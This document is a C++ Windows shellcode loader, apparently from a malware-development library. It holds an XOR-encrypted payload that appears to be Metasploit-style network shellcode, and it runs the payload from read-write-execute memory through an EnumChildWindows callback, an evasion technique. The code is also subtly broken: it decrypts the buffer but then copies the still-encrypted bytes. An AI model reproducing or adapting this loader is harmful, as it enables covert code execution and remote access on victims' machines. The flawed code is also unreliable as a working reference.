#include <windows.h>
#include <stdio.h>
#include "MalDev-Lib-main/lib-Shellcode/Shellcode.h"
int main(){
    unsigned char shellcode[] = "\xe3\xf7\x9d\x1f\x1f\x1f\x7f\x96\xfa\x2e\xdf\x7b\x94\x4f\x2f\x94\x4d\x13\x94\x4d\x0b\x94\x6d\x37\x10\xa8\x55\x39\x2e\xe0\xb3\x23\x7e\x63\x1d\x33\x3f\xde\xd0\x12\x1e\xd8\xfd\xed\x4d\x48\x94\x4d\x0f\x94\x55\x23\x94\x53\x0e\x67\xfc\x57\x1e\xce\x4e\x94\x46\x3f\x1e\xcc\x94\x56\x07\xfc\x25\x56\x94\x2b\x94\x1e\xc9\x2e\xe0\xb3\xde\xd0\x12\x1e\xd8\x27\xff\x6a\xe9\x1c\x62\xe7\x24\x62\x3b\x6a\xfb\x47\x94\x47\x3b\x1e\xcc\x79\x94\x13\x54\x94\x47\x03\x1e\xcc\x94\x1b\x94\x1e\xcf\x96\x5b\x3b\x3b\x44\x44\x7e\x46\x45\x4e\xe0\xff\x40\x40\x45\x94\x0d\xf4\x92\x42\x77\x2c\x2d\x1f\x1f\x77\x68\x6c\x2d\x40\x4b\x77\x53\x68\x39\x18\xe0\xca\xa7\x8f\x1e\x1f\x1f\x36\xdb\x4b\x4f\x77\x36\x9f\x74\x1f\xe0\xca\x4f\x4f\x4f\x4f\x5f\x4f\x5f\x4f\x77\xf5\x10\xc0\xff\xe0\xca\x88\x75\x1a\x77\xdf\xb7\x1f\x20\x77\x1d\x1f\x1b\xa3\x96\xf9\x75\x0f\x49\x48\x77\x86\xba\x6b\x7e\xe0\xca\x9a\xdf\x6b\x13\xe0\x51\x17\x6a\xf3\x77\xef\xaa\xbd\x49\xe0\xca\x77\x7c\x72\x7b\x1f\x96\xfc\x48\x48\x48\x2e\xe9\x75\x0d\x46\x49\xfd\xe2\x79\xd8\x5b\x3b\x23\x1e\x1e\x92\x5b\x3b\x0f\xd9\x1f\x5b\x4b\x4f\x49\x49\x49\x59\x49\x51\x49\x49\x4c\x49\x77\x66\xd3\x20\x99\xe0\xca\x96\xff\x51\x49\x59\xe0\x2f\x77\x17\x98\x02\x7f\xe0\xca\xa4\xef\xaa\xbd\x49\x77\xb9\x8a\xa2\x82\xe0\xca\x23\x19\x63\x15\x9f\xe4\xff\x6a\x1a\xa4\x58\x0c\x6d\x70\x75\x1f\x4c\x1f";

    unsigned char key = 0x1F;
    unsigned char iv[] = "123456789";
    int len = sizeof(shellcode);
 
    Shellcode sc(shellcode,len);
 
    unsigned char * decrypted = sc.XOR_decrypt(key);

    
 
    HANDLE hAlloc = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(hAlloc, shellcode, len);
    EnumChildWindows((HWND) NULL,(WNDENUMPROC) hAlloc,NULL);
    return 0;
}